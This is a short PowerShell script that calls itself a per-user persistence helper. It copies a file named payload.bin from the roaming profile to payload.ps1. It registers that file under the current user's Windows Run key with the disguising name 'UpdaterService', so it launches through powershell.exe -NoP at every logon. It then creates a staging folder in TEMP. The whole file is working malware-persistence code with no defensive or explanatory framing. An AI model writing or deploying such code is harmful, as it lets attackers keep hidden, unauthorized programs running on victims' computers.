
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = "UpdaterService",
    [string]$PersistencePath = "$env:APPDATA\payload.ps1"
)
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:APPDATA\payload.bin" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
    $FetchResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
    Write-Verbose ("Registered value: " + $FetchResult.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$StageMarker = "stage-21"
